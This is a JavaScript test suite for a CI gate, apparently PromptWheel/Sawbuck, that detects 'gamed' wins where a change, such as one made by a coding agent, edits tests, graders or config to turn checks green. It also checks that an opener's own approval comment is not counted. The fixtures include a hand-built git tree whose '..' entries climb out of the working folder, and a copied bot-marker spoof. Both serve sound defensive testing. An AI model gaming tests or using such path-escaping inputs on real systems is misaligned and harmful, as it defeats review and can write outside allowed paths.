test('own git: a file name with a byte above 127 in it: an honest fix reads pass, a gamed win reads gamed, and the report names the file as it is on disk', () => {
  const a = ownGitRepo([], 'src/añadir.mjs', 'test/añadir.test.mjs'); a.fix();
  const ra = a.report(); assert.equal(ra.verdict, 'pass', 'an honest fix in src/añadir.mjs');
  const b = ownGitRepo([], 'src/añadir.mjs', 'test/añadir.test.mjs'); b.game();
  const rb = b.report(); assert.equal(rb.verdict, 'gamed', 'a gamed win on test/añadir.test.mjs');
  assert.doesNotMatch(JSON.stringify(rb), /\\\\303|\\\\261/, 'no escaped bytes in the report');
  rmSync(a.d, { recursive: true, force: true }); rmSync(b.d, { recursive: true, force: true });
});
test('own git: a new workflow file is a protected path whatever its name holds (a byte above 127, a double quote, a tab)', { skip: process.platform === 'win32' && 'a double quote and a tab are not file-name characters on Windows' }, () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-wfname-'));
  const g = (a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g(['init', '-q']); g(['config', 'user.email', 'a@b.c']); g(['config', 'user.name', 'a']);
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', scripts: { test: 'node -e 0' } }));
  mkdirSync(join(d, '.github/workflows'), { recursive: true }); writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\non: push\njobs: {}\n'); commitAll(d, 'base');
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'sign');
  const run = () => { const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']); return { code: r.code, rep: JSON.parse(r.out.slice(r.out.indexOf('{'))) }; };
  for (const name of ['plain.yml', 'añadir.yml', 'it"s.yml', 'a\tb.yml']) {
    writeFileSync(join(d, '.github/workflows', name), 'name: x\non: push\njobs: {}\n'); commitAll(d, `a new workflow: ${JSON.stringify(name)}`);
    const r = run();
    assert.equal(r.code, 1, `a new workflow named ${JSON.stringify(name)} fails with no reason`);
    assert.ok((r.rep.mandates || []).some((m) => m.name === 'workflows-frozen'), `and it is the workflow rule that says so, for ${JSON.stringify(name)}: ${JSON.stringify(r.rep.mandates)}`);
  }
  rmSync(d, { recursive: true, force: true });
});
// A person's git hooks are for the person's own checkouts. The engine's throwaway worktrees ran them (post-checkout
// fires on `git worktree add`), six times a check; one that exits 1 on a detached HEAD stopped every check ("could
// not run"), so a gamed commit was not sent back, and each try left a worktree behind in the repo.
test('own git: the engine\'s throwaway checkouts run none of the person\'s git hooks, so a post-checkout hook that fails does not stop the check, and no worktree is left behind', { skip: process.platform === 'win32' }, () => {
  const a = ownGitRepo();
  const hooks = mkdtempSync(join(tmpdir(), 'pw-hooks-'));
  writeFileSync(join(hooks, 'post-checkout'), `#!/bin/sh\necho ran >> "${hooks}/log"\nexit 1\n`); chmodSync(join(hooks, 'post-checkout'), 0o755);
  execFileSync('git', ['config', 'core.hooksPath', hooks], { cwd: a.d });
  a.game(); assert.equal(a.report().verdict, 'gamed', 'the check ran, and read the gamed win');
  assert.ok(!existsSync(join(hooks, 'log')), 'the hook did not run in a checkout the engine made');
  assert.equal(execFileSync('git', ['worktree', 'list'], { cwd: a.d, encoding: 'utf8' }).trim().split('\n').length, 1, 'no worktree is left in the repo');
  rmSync(a.d, { recursive: true, force: true }); rmSync(hooks, { recursive: true, force: true });
});

// ---------------------------------------------------- the report names the goalposts a change moved (gate.goalposts)
// What the source-only re-run does not take from a change: tests, graders, config, declared evaluator paths, the
// runner a guard names, and the test keys of a package.json or pyproject.toml. A caller that holds a gamed verdict over
// a span until it is earned (Sawbuck, at the end of a turn) could not tell "the test was put back and the suite is red
// as before" from "the test is still edited and the suite is red": both read inconclusive, and the first was sent back
// turn after turn (proof-bench/beside-guard, 2026-11-16). With no goalpost moved the source-only tree IS the head
// tree, so nothing over that span can read gamed.
test('gate.goalposts: names the test a gamed win edited, and is empty once the test is put back with a source edit left in', () => {
  const d = gamedRepo(); commitAll(d, 'make it green');
  let r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'gamed'); assert.deepEqual(r.gate.goalposts, ['calc.test.mjs']);
  const base = rev(d, 'HEAD~1');
  writeFileSync(join(d, 'calc.test.mjs'), CALC(2)); writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a * b;\n');
  commitAll(d, 'put the test back; a try at the source that does not fix it');
  r = check({ repo: d, base, head: 'HEAD' });
  assert.equal(r.verdict, 'inconclusive', JSON.stringify(r.metrics));
  assert.deepEqual(r.gate.goalposts, [], 'only source changed over the span');
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  rmSync(d, { recursive: true, force: true });
});
test('gate.goalposts: a test command changed inside package.json is a goalpost, and a dependency added there is not', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'node --test calc.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }]);
  const pkg = (o) => writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', version: '1.0.0', scripts: { test: 'node --test' }, dependencies: {}, ...o }, null, 2) + '\n');
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a - b;\n'); writeFileSync(join(d, 'calc.test.mjs'), CALC(2)); pkg({}); commitAll(d, 'base');
  pkg({ dependencies: { leftpad: '1.0.0' } }); commitAll(d, 'a dependency');
  assert.deepEqual(check({ repo: d, base: 'HEAD~1', head: 'HEAD' }).gate.goalposts, [], 'package.json changed, its test keys did not');
  pkg({ dependencies: { leftpad: '1.0.0' }, scripts: { test: 'true' } }); commitAll(d, 'the test command');
  assert.deepEqual(check({ repo: d, base: 'HEAD~1', head: 'HEAD' }).gate.goalposts, ['package.json']);
  rmSync(d, { recursive: true, force: true });
});
test('gate.goalposts: the contract file, a declared evaluator path and a pyproject test table are goalposts; a plain source file is not', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'node --test calc.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }]);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, evaluatorPaths: ['budget.json'] }));
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a - b;\n'); writeFileSync(join(d, 'calc.test.mjs'), CALC(2));
  writeFileSync(join(d, 'budget.json'), '{"max":0}\n'); writeFileSync(join(d, 'pyproject.toml'), '[project]\nname = "a"\n\n[tool.pytest.ini_options]\naddopts = ""\n');
  commitAll(d, 'base');
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a - b; // tidy\n'); commitAll(d, 'source only');
  assert.deepEqual(check({ repo: d, base: 'HEAD~1', head: 'HEAD' }).gate.goalposts, []);
  writeFileSync(join(d, 'budget.json'), '{"max":5}\n');
  writeFileSync(join(d, 'pyproject.toml'), '[project]\nname = "a"\n\n[tool.pytest.ini_options]\naddopts = "-k mul"\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, evaluatorPaths: ['budget.json'], repeat: 1 }));
  commitAll(d, 'three goalposts');
  assert.deepEqual(check({ repo: d, base: 'HEAD~1', head: 'HEAD' }).gate.goalposts, ['budget.json', 'promptwheel.config.json', 'pyproject.toml']);
  rmSync(d, { recursive: true, force: true });
});
test('gate.goalposts: a report whose goalposts are empty is never gamed, on every fixture of this kind; and with detection off the report does not say', () => {
  const d = gamedRepo(); commitAll(d, 'make it green');
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a - b;\n'); commitAll(d, 'the real fix, on top of the edited test');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.deepEqual(r.gate.goalposts, []); assert.ok(!r.metrics.some((m) => m.gamed === true), 'nothing gamed where no goalpost moved');
  assert.equal(check({ repo: d, base: 'HEAD~1', head: 'HEAD', detectGaming: false }).gate, undefined, 'no gate record, so no goalposts, when detection is off');
  assert.equal(conformsToContract({ ...r, gate: { ...r.gate, goalposts: 'calc.test.mjs' } }).ok, false, 'goalposts must be an array of paths');
  rmSync(d, { recursive: true, force: true });
});

// ---- a count that holds for the repo can still fall in one file (proof-bench/outside-repos, gates/RESULT.md: four of
// fifteen home-made gates read per file; the released 0.8.14 passed a test emptied of its assertions when another
// file gained as many). A note on the metric, `lostIn`; never a verdict.
const SPEC = (name, lines) => `const { test, expect } = require('./h');\ntest('${name}', () => {\n${lines.map((l) => '  ' + l).join('\n')}\n});\n`;
const perFileRepo = (files) => {
  const d = repoWith({ 'package.json': JSON.stringify({ name: 'a' }), 'src/a.js': 'exports.f = () => 1\n', ...files });
  assert.equal(pw(d, ['init', '--no-agent-block']).code, 0);
  const f = join(d, 'promptwheel.config.json'); const c = JSON.parse(readFileSync(f, 'utf8'));
  writeFileSync(f, JSON.stringify({ ...c, metrics: c.metrics.map((m) => (m.name === 'tests_pass' ? { ...m, cmd: 'true' } : m)) }, null, 2)); commitAll(d, 'sign');
  return d;
};
const PAY = ['expect(total(3, 4)).toBe(7);', 'expect(total(0, 0)).toBe(0);', 'expect(() => total(-1, 2)).toThrow(/negative/);'];
const lostIn = (r, name) => (r.rep.metrics.find((m) => m.name === name) || {}).lostIn;
test('a test file emptied of its assertions while another file gains as many: the total holds, and the file is named', () => {
  const d = perFileRepo({ 'test/pay.test.js': SPEC('pay adds up', PAY) });
  writeFileSync(join(d, 'test/pay.test.js'), SPEC('pay adds up', ['total(3, 4);']));
  writeFileSync(join(d, 'test/other.test.js'), SPEC('other', ['expect(1).toBe(1);', 'expect(2).toBe(2);', 'expect(3).toBe(3);']));
  commitAll(d, 'swap');
  const r = gateRun(d);
  assert.equal(r.rep.verdict, 'pass', 'a note, never a verdict');
  assert.deepEqual(lostIn(r, 'assertions'), [{ file: 'test/pay.test.js', before: 3, after: 0 }]);
  assert.equal(lostIn(r, 'test_count'), undefined, 'the test itself is still there');
  assert.match(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto']).out, /note: test\/pay\.test\.js has fewer assertions \(3 → 0\), though the repo's total did not fall/);
});
test('a test file moved, split in two, or left alone while tests are added: no file is named', () => {
  const two = SPEC('pay adds up', PAY) + SPEC('pay refuses a bad sum', ['expect(() => total("a", 1)).toThrow(TypeError);', 'expect(() => total(null, 1)).toThrow(TypeError);']).split('\n').slice(1).join('\n');
  let d = perFileRepo({ 'test/pay.test.js': two });
  mkdirSync(join(d, 'test/billing')); execFileSync('git', ['mv', 'test/pay.test.js', 'test/billing/pay.test.js'], { cwd: d }); commitAll(d, 'move');
  let r = gateRun(d); assert.equal(lostIn(r, 'assertions'), undefined, 'moved whole'); assert.equal(lostIn(r, 'test_count'), undefined);
  d = perFileRepo({ 'test/pay.test.js': two });
  writeFileSync(join(d, 'test/pay.test.js'), SPEC('pay adds up', PAY));
  writeFileSync(join(d, 'test/pay-bad.test.js'), SPEC('pay refuses a bad sum', ['expect(() => total("a", 1)).toThrow(TypeError);', 'expect(() => total(null, 1)).toThrow(TypeError);']));
  commitAll(d, 'split');
  r = gateRun(d); assert.equal(lostIn(r, 'assertions'), undefined, 'split in two'); assert.equal(lostIn(r, 'test_count'), undefined);
  d = perFileRepo({ 'test/pay.test.js': two });
  writeFileSync(join(d, 'test/new.test.js'), SPEC('new', ['expect(9).toBe(9);'])); writeFileSync(join(d, 'src/a.js'), 'exports.f = () => 2\n'); commitAll(d, 'add');
  r = gateRun(d); assert.equal(lostIn(r, 'assertions'), undefined, 'only additions');
});

// ---- 0.8.15: a change read from the files it touched alone (changeCounts). Where a count fell, and the per-file
// note, used to check out both commits again and count the whole tree by file: 3 to 22 seconds on real pull requests
// (proof-bench/outside-repos). A grep count is a sum over files, so the files a change did not touch cancel: only the
// touched files are written out, as they stood at each end, and the contract's own command counts them.
const engineNow = await import('../bin/promptwheel.mjs');
const FOUR = ['test_count', 'skipped_tests', 'suppressions', 'assertions'];
const readerRepo = () => {
  const d = repoWith({
    'package.json': JSON.stringify({ name: 'a' }), 'src/a.js': 'exports.f = () => 1\n',
    'test/a.test.js': "test('one', () => { expect(1).toBe(1); expect(2).toBe(2); });\ntest('two', () => { expect(3).toBe(3); });\n",
    'test/gone.test.js': "test('gone', () => { expect(4).toBe(4); });\nit('gone too', () => { assert.ok(1); });\n",
    'test/moved.test.js': "test('moved', () => { expect(5).toBe(5); });\n",
    'test/still.test.js': "test('still', () => { expect(6).toBe(6); });\n",
    'docs/guide.md': 'Call it (once) and test (twice).\n',
  });
  assert.equal(pw(d, ['init', '--no-agent-block']).code, 0);
  commitAll(d, 'sign');
  return d;
};
const tripwireCfg = (d) => { const c = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8')); return { ...c, metrics: c.metrics.filter((m) => FOUR.includes(m.name)) }; };
const wholeTree = (d, base, head, config) => Object.fromEntries(check({ repo: d, base, head, config, detectGaming: false }).metrics.map((m) => [m.name, m.after - m.before]));
test('changeCounts: the change in every count is the same as counting both whole trees, and no commit is checked out', () => {
  const d = readerRepo(); const config = tripwireCfg(d); const base = rev(d);
  writeFileSync(join(d, 'test/a.test.js'), "test('one', () => { expect(1).toBe(1); });\n");                      // a test and two assertions gone
  writeFileSync(join(d, 'test/new.test.js'), "test('n1', () => { expect(7).toBe(7); });\nit.skip('n2', () => {});\n");   // added, one skipped
  rmSync(join(d, 'test/gone.test.js'));                                                                          // deleted
  mkdirSync(join(d, 'test/sub')); execFileSync('git', ['mv', 'test/moved.test.js', 'test/sub/moved.test.js'], { cwd: d });   // moved
  mkdirSync(join(d, 'dist')); writeFileSync(join(d, 'dist/built.test.js'), "test('built', () => { expect(8).toBe(8); });\n");   // a folder the count leaves out
  writeFileSync(join(d, 'docs/guide.md'), 'Call it (once), test (twice), describe (it), expect (nothing).\n');    // not a code file
  writeFileSync(join(d, 'test/ñandú más.test.js'), "test('ñ', () => { expect(9).toBe(9); });\n");                  // a name git would quote
  symlinkSync('a.test.js', join(d, 'test/link.test.js'));                                                         // a link: grep -r does not follow one
  writeFileSync(join(d, 'src/a.js'), '// eslint-disable-next-line no-undef\nexports.f = () => 1\n');              // one more silenced check
  commitAll(d, 'a change of every kind');
  const whole = wholeTree(d, base, 'HEAD', config);
  assert.deepEqual(whole, { test_count: -1, skipped_tests: 1, suppressions: 1, assertions: -2 }, 'the fixture moves all four counts');
  const before = execFileSync('git', ['worktree', 'list'], { cwd: d, encoding: 'utf8' });
  const got = engineNow.changeCounts({ repo: d, base, head: 'HEAD', config });
  assert.deepEqual(Object.fromEntries(FOUR.map((n) => [n, got[n].delta])), whole);
  assert.deepEqual(got.test_count.files['test/a.test.js'], [2, 1]);
  assert.deepEqual(got.test_count.files['test/gone.test.js'], [2, 0]);
  assert.deepEqual(got.test_count.files['test/ñandú más.test.js'], [0, 1], 'a name with a space and bytes above 127 is read as it is');
  assert.equal(got.test_count.files['dist/built.test.js'], undefined, 'a folder the contract leaves out is left out here');
  assert.equal(got.test_count.files['test/link.test.js'], undefined, 'a link is not read');
  assert.equal(got.test_count.files['test/still.test.js'], undefined, 'a file the change did not touch is not read at all');
  assert.equal(execFileSync('git', ['worktree', 'list'], { cwd: d, encoding: 'utf8' }), before);
  rmSync(d, { recursive: true, force: true });
});
test('changeCounts: a count that is not a counting grep is not guessed at, and a change that touches no file reads zero', () => {
  const d = readerRepo(); const config = tripwireCfg(d);
  config.metrics.push({ name: 'todos', cmd: 'grep -rn TODO . --include=*.js 2>/dev/null | wc -l', extract: 'number', direction: 'down', guard: true });
  const got = engineNow.changeCounts({ repo: d, base: 'HEAD', head: 'HEAD', config });
  assert.equal(got.todos, null, 'only the tripwires init writes are read this way');
  assert.deepEqual(got.test_count, { delta: 0, files: {} });
  rmSync(d, { recursive: true, force: true });
});
test('changeCounts: a tree made by hand to climb out of the folder writes nothing outside it', () => {
  const d = readerRepo(); const config = tripwireCfg(d);
  const g = (args, input) => execFileSync('git', args, { cwd: d, input, encoding: 'utf8' }).trim();
  const blob = g(['hash-object', '-w', '--stdin'], "test('escaped', () => { expect(1).toBe(1); });\n");
  // a tree whose one entry is named "..", holding another "..", holding a test file: git makes no such tree on its
  // own. Two steps up from a side folder is the temp folder itself.
  const up = (tree) => execFileSync('git', ['hash-object', '-t', 'tree', '-w', '--literally', '--stdin'], { cwd: d, input: Buffer.concat([Buffer.from('40000 ..\0'), Buffer.from(tree, 'hex')]), encoding: 'utf8' }).trim();
  const evil = up(up(g(['mktree'], `100644 blob ${blob}\tpw-escaped-${process.pid}.test.js\n`)));
  assert.match(g(['diff-tree', '-r', '--name-only', 'HEAD', evil]), /^\.\.\/\.\.\/pw-escaped-/m, 'git itself names the path that climbs');
  const commit = g(['commit-tree', evil, '-p', 'HEAD', '-m', 'a tree that climbs out']);
  const landed = join(tmpdir(), `pw-escaped-${process.pid}.test.js`);
  let got; assert.doesNotThrow(() => { got = engineNow.changeCounts({ repo: d, base: 'HEAD', head: commit, config }); });
  assert.equal(existsSync(landed), false, 'nothing was written beside the scratch folder');
  assert.ok(got === null || !Object.keys((got.test_count || {}).files || {}).some((f) => f.includes('..')), 'and the path is not counted');
  rmSync(d, { recursive: true, force: true });
});
test('run: where a count fell is read from the change alone, and names the same files as before', () => {
  const d = readerRepo();
  writeFileSync(join(d, 'test/a.test.js'), "test('one', () => { expect(1).toBe(1); });\n"); rmSync(join(d, 'test/gone.test.js'));
  writeFileSync(join(d, 'test/new.test.js'), "test('n1', () => {});\n"); commitAll(d, 'two files lose tests, one gains');
  const log = join(TMP_ROOT, `git-calls-${process.pid}.log`); const bin = mkdtempSync(join(TMP_ROOT, 'gitlog-'));
  const real = execFileSync('sh', ['-c', 'command -v git'], { encoding: 'utf8' }).trim();
  writeFileSync(join(bin, 'git'), `#!/bin/sh\necho "$*" >> ${JSON.stringify(log)}\nexec ${JSON.stringify(real)} "$@"\n`); chmodSync(join(bin, 'git'), 0o755);
  const r = spawnSync('node', [ENGINE, 'run', '--base', 'HEAD~1', '--head', 'HEAD', '--json', '--no-record', '--no-auto'], { cwd: d, encoding: 'utf8', env: { ...process.env, PATH: `${bin}:${process.env.PATH}` } });
  const rep = JSON.parse(r.stdout);
  assert.deepEqual(rep.metrics.find((m) => m.name === 'test_count').where, [{ file: 'test/gone.test.js', before: 2, after: 0 }, { file: 'test/a.test.js', before: 2, after: 1 }]);
  const adds = readFileSync(log, 'utf8').split('\n').filter((l) => /worktree add/.test(l)).length;
  assert.equal(adds, 2, `the two commits are checked out once each, for the measure itself, and never again to say where (${adds} checkouts)`);
  rmSync(d, { recursive: true, force: true });
});

// ---- 0.8.15: the comment on a pull request. Until now the Action posted a new comment on every push, a pass
// included, titled "PromptWheel, outcome gate", with a link to the engine (run on the released 0.8.14: ten pushes,
// ten comments). Now: ONE comment, edited in place, and only when there is something to say. It is Sawbuck's, with
// one link, to the one repo. The sentences that tell a fix run how to get through are the measured ones, unchanged.
const prRep = (over = {}) => ({ base: 'aaa1111', head: 'bbb2222', mode: 'refs', repeat: 1, verdict: 'pass',
  metrics: [{ name: 'tests_pass', guard: true, before: 1, after: 1, delta: 0, status: 'unchanged', confidence: 'high', ok: true }], ...over });
const FELL = { name: 'test_count', guard: true, before: 3, after: 2, delta: -1, status: 'regressed', confidence: 'high', ok: false, allowable: true, where: [{ file: 'test/a.test.js', before: 2, after: 1 }] };
const sentBack = (over = {}) => prRep({ verdict: 'fail', metrics: [prRep().metrics[0], FELL], explained: [{ metric: 'test_count', noted: false, what: 'fewer tests', allowable: true }], allowable: ['test_count'], protects: 9, ...over });
const KEY = 'Sawbuck/contract';
const botComment = (id, body, key = KEY) => ({ id, body: `<!-- sawbuck-check: ${key} -->\n${body}`, user: { login: 'github-actions[bot]', type: 'Bot' } });
const plan = (o) => engineNow.commentPlan({ key: KEY, comments: [], ...o });
test('the comment is Sawbuck\'s: its name, one link to the one repo, the numbers folded away, the measured sentences as they were', () => {
  const md = renderMarkdown(sentBack());
  assert.match(md, /^### ❌ Sawbuck: sent back$/m);
  assert.doesNotMatch(md, /PromptWheel|promptwheel-ai|outcome gate/);
  assert.deepEqual(md.match(/\]\(https?:[^)]*\)/g), ['](https://github.com/sawbuck-ai/sawbuck)'], 'one link, to the one repo');
  assert.ok(md.indexOf('<details>') > 0 && md.indexOf('<details>') < md.indexOf('| metric |') && md.indexOf('| metric |') < md.indexOf('</details>'), 'the table sits inside the fold');
  assert.ok(md.indexOf('Put back what was removed, and push') < md.indexOf('<details>'), 'what to do is in view');
  assert.match(md, /> \*\*Where:\*\* `test\/a\.test\.js` \(2 → 1\)/);
  assert.match(md, /> Put back what was removed, and push\. Or, if removing it is the job:\n>\n> To accept this, someone with write access who did not open this PR comments `sawbuck-allow: <their reason>` on it, and the check is run again\./);
  assert.match(md, /verdict FAIL/, 'the engine\'s own word for it is still there, with the numbers');
  assert.match(renderMarkdown(prRep({ verdict: 'gamed', metrics: [{ ...prRep().metrics[0], status: 'improved', gamed: true, retained: 0 }] })), /^### 🚩 Sawbuck: sent back\n\n> 🚩 A metric "improved" only because/m, 'a gamed win says why in view, not in the fold');
  assert.doesNotMatch(renderMarkdown(sentBack(), { fold: false }), /<details>/, 'the job summary gets it unfolded');
});
test('a comment only when there is something to say: ten passing pushes leave none, and a pass with only watch-notes leaves none', () => {
  const comments = [{ id: 1, body: 'looks good to me', user: { login: 'pat', type: 'User' } }];
  for (let push = 0; push < 10; push++) { const p = plan({ report: prRep({ head: `bbb000${push}` }), exit: 0, comments }); assert.equal(p.action, 'none', `push ${push}`); assert.equal(p.body, ''); }
  const noted = prRep({ explained: [{ metric: 'dependency_entries', noted: true, what: 'a new dependency' }, { metric: 'environment', noted: true, what: 'the environment this ran in can change which tests run, or load code into them', items: ['PYTEST_ADDOPTS'] }] });
  assert.equal(plan({ report: noted, exit: 0 }).action, 'none', 'a new dependency as a note, or a note about the environment, does not open a comment');
  assert.match(plan({ report: noted, exit: 0 }).summary, /a new dependency/, 'it is in the job summary, on every run');
  assert.match(plan({ report: prRep(), exit: 0 }).summary, /\| metric \|/); assert.doesNotMatch(plan({ report: prRep(), exit: 0 }).summary, /<details>/);
});
test('one comment, edited in place: a send-back makes it, the next push edits it, and the fix edits it to a short passing line', () => {
  const first = plan({ report: sentBack(), exit: 1 });
  assert.equal(first.action, 'create'); assert.match(first.body, /^<!-- sawbuck-check: Sawbuck\/contract -->\n### ❌ Sawbuck: sent back/);
  const thread = [{ id: 7, body: 'why is this red?', user: { login: 'pat', type: 'User' } }, botComment(41, first.body.split('\n').slice(1).join('\n'))];
  const second = plan({ report: sentBack({ head: 'ccc3333' }), exit: 1, comments: thread });
  assert.deepEqual([second.action, second.id], ['update', 41], 'the same comment, not a second one'); assert.match(second.body, /ccc3333/);
  const fixed = plan({ report: prRep({ head: 'ddd4444' }), exit: 0, comments: thread });
  assert.deepEqual([fixed.action, fixed.id], ['update', 41], 'a comment that said "sent back" is not left standing on a pull request that passes');
  assert.match(fixed.body, /^<!-- sawbuck-check: Sawbuck\/contract -->\n### ✅ Sawbuck: passes\n\nNothing to add on this push \(`aaa1111 → ddd4444`\)\. What this comment said about an earlier push is in its edit history\./);
  assert.doesNotMatch(fixed.body, /\| metric \|/, 'short: no table');
  const again = plan({ report: prRep({ head: 'ddd4444' }), exit: 0, comments: [botComment(41, fixed.body.split('\n').slice(1).join('\n'))] });
  assert.equal(again.action, 'none', 'the same words are not posted twice');
});
test('the one comment is known by its hidden line AND its author: a person who copies the line is not written over, and another workflow has its own', () => {
  const copied = { id: 9, body: `<!-- sawbuck-check: ${KEY} -->\n### ✅ Sawbuck: passes`, user: { login: 'mallory', type: 'User' } };
  assert.equal(plan({ report: sentBack(), exit: 1, comments: [copied] }).action, 'create');
  assert.equal(plan({ report: prRep(), exit: 0, comments: [copied] }).action, 'none');
  const other = botComment(12, 'x', 'PromptWheel/outcome-gate');
  assert.equal(plan({ report: sentBack(), exit: 1, comments: [other] }).action, 'create', 'a second workflow that uses the Action keeps its own comment');
  assert.deepEqual([plan({ report: sentBack(), exit: 1, comments: [botComment(3, 'a'), other, botComment(5, 'b')] }).id], [5], 'the newest of its own');
  assert.match(plan({ report: sentBack(), exit: 1, key: 'a --> <b>\nc' }).body, /^<!-- sawbuck-check: a -- bc -->\n/, 'a name cannot close the hidden line');
});
test('what counts as something to say: a reason that was used, a file that lost its tests, the check\'s own definition changed', () => {
  const allowed = prRep({ allowed: { reason: 'the rule it checked went (approved by pat)', cleared: ['test_count'] }, allowable: ['test_count'] });
  let p = plan({ report: allowed, exit: 0 }); assert.equal(p.action, 'create'); assert.match(p.body, /### ✅ Sawbuck: passes\n\n> ✓ \*\*Allowed:\*\* `test_count` cleared by a declared reason: the rule it checked went \(approved by pat\)/);
  const lost = prRep({ metrics: [prRep().metrics[0], { name: 'assertions', guard: true, before: 9, after: 9, delta: 0, status: 'unchanged', confidence: 'high', ok: true, lostIn: [{ file: 'test/pay.test.js', before: 3, after: 0 }] }] });
  p = plan({ report: lost, exit: 0 }); assert.equal(p.action, 'create');
  assert.match(p.body, /> ℹ️ \*\*Note:\*\* `test\/pay\.test\.js` has fewer assertions \(3 → 0\), though the repo's total did not fall\./);
  p = plan({ report: prRep({ gate: { changed: true, fingerprint: { base: 'f1', head: 'f2' } } }), exit: 0 }); assert.equal(p.action, 'create'); assert.match(p.body, /Gate definition changed/);
});
test('comment: always gives the whole report on every run, still in one comment; comment: false gives none', () => {
  let p = plan({ report: prRep(), exit: 0, comment: 'always' }); assert.equal(p.action, 'create'); assert.match(p.body, /### ✅ Sawbuck: passes/); assert.match(p.body, /\| metric \|/);
  p = plan({ report: prRep({ head: 'eee5555' }), exit: 0, comment: 'always', comments: [botComment(2, 'x')] }); assert.deepEqual([p.action, p.id], ['update', 2]);
  assert.equal(plan({ report: sentBack(), exit: 1, comment: 'false' }).action, 'none');
  assert.match(plan({ report: sentBack(), exit: 1, comment: 'false' }).summary, /sent back/, 'the job summary still has it');
});
test('could not measure: a comment where that fails the job, none where the workflow says it passes', () => {
  const inc = prRep({ verdict: 'inconclusive', metrics: [{ ...prRep().metrics[0], before: 0, after: 0, inert: true }] });
  let p = plan({ report: inc, exit: 3, inconclusive: 'fail' }); assert.equal(p.action, 'create'); assert.match(p.body, /### 🟡 Sawbuck: could not measure\n\n> 🟡 A 🛡️ guarded check is \*\*inert\*\*/);
  p = plan({ report: inc, exit: 3, inconclusive: 'pass' }); assert.equal(p.action, 'none'); assert.match(p.summary, /could not measure/);
});
test('comment-only: the comment says what would have been sent back, and that this check never fails the job here', () => {
  let p = plan({ report: sentBack(), exit: 1, commentOnly: true });
  assert.equal(p.action, 'create'); assert.equal(p.wouldFail, true);
  assert.match(p.body, /### ✋ Sawbuck, comment only: this would have been sent back\n\nThis check only comments here\. It never fails the job\.\n\n> ✋ \*\*Needs a look:\*\* fewer tests/);
  p = plan({ report: prRep(), exit: 0, commentOnly: true }); assert.equal(p.action, 'none'); assert.equal(p.wouldFail, false);
  // a check that measured nothing is not called a send-back: it says what it is
  p = plan({ report: prRep({ verdict: 'inconclusive', metrics: [{ ...prRep().metrics[0], before: 0, after: 0, inert: true }] }), exit: 3, inconclusive: 'fail', commentOnly: true });
  assert.match(p.body, /### 🟡 Sawbuck, comment only: could not measure\n\nThis check only comments here\. It never fails the job\./);
  p = plan({ report: null, exit: 64, error: 'some warning\npromptwheel: promptwheel.config.json is not valid JSON (Unexpected token } at 12)\n', commentOnly: true });
  assert.equal(p.action, 'create'); assert.match(p.body, /### ⚠️ Sawbuck: could not run\n\nNothing was checked on this push:\n\n> promptwheel: promptwheel\.config\.json is not valid JSON \(Unexpected token \} at 12\)/);
  assert.match(plan({ report: null, exit: 64, error: '' }).body, /could not run/, 'with comment-only off too: a red job says why');
});
test('what was not counted is said in the comment; and where the base contract says one person works here, the way through says so', () => {
  const note = '\n> ✋ **Not counted:** a `sawbuck-allow:` comment from `acme-agent-svc`, the account that opened this pull request.\n';
  assert.match(plan({ report: sentBack(), exit: 1, note }).body, /\*\*Not counted:\*\* a `sawbuck-allow:` comment from `acme-agent-svc`/);
  assert.doesNotMatch(plan({ report: prRep(), exit: 0, comments: [botComment(4, 'x')], note }).body, /Not counted/, 'nothing needed a reason on a push that passes');
  const solo = renderMarkdown(sentBack({ openerCounts: true }));
  assert.match(solo, /> To accept this, comment `sawbuck-allow: <the reason>` on this PR, and the check is run again\. One person works in this repo, so a comment from the account that opened the PR counts\./);
  assert.doesNotMatch(solo, /who did not open this PR/);
});
test('pr-comment: the command the Action runs prints what to do, writes the comment and the summary, and refuses a flag it does not know', () => {
  const d = mkdtempSync(join(TMP_ROOT, 'prc-')); const f = (n) => join(d, n);
  writeFileSync(f('report.json'), JSON.stringify(sentBack())); writeFileSync(f('comments.jsonl'), ''); writeFileSync(f('summary.md'), 'earlier step\n');
  const run = (...a) => spawnSync('node', [ENGINE, 'pr-comment', '--report', f('report.json'), '--comments', f('comments.jsonl'), '--key', KEY, '--body', f('body.md'), '--summary', f('summary.md'), ...a], { encoding: 'utf8' });
  let r = run('--exit', '1'); assert.equal(r.status, 0, r.stderr); assert.equal(r.stdout.trim(), 'create');
  assert.match(readFileSync(f('body.md'), 'utf8'), /^<!-- sawbuck-check: Sawbuck\/contract -->\n### ❌ Sawbuck: sent back/);
  assert.match(readFileSync(f('summary.md'), 'utf8'), /^earlier step\n[\s\S]*Sawbuck: sent back/, 'the summary is added to, never written over');
  writeFileSync(f('comments.jsonl'), JSON.stringify({ id: 1, body: 'hi', user: { login: 'pat', type: 'User' } }) + '\n' + JSON.stringify(botComment(88, 'old')) + '\n');
  assert.equal(run('--exit', '1').stdout.trim(), 'update:88');
